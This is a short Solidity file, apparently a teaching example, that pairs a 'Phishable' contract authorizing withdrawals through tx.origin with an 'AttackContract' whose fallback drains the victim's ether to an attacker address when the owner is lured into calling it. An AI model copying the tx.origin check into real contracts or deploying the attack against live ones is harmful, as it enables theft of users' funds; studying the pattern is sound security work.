pragma solidity >=0.5.0;
    

contract Phishable {
    
  address public owner;
  
  constructor(address _owner) public { 
    owner = _owner; 
  }
  
  function() external payable {} // collect ether
  
  function withdrawAll(address payable _recipient) public { 
    require(tx.origin == owner);
    _recipient.transfer(address(this).balance); 
  } 
  
}


contract AttackContract {
    
  Phishable phishableContract; 
  
  address payable attacker; 
  
  constructor(Phishable _contract, address payable _attacker) public {
    phishableContract = _contract;
    attacker = _attacker; 
  } 
  
  function () external payable { 
    phishableContract.withdrawAll(attacker); 
  } 
} 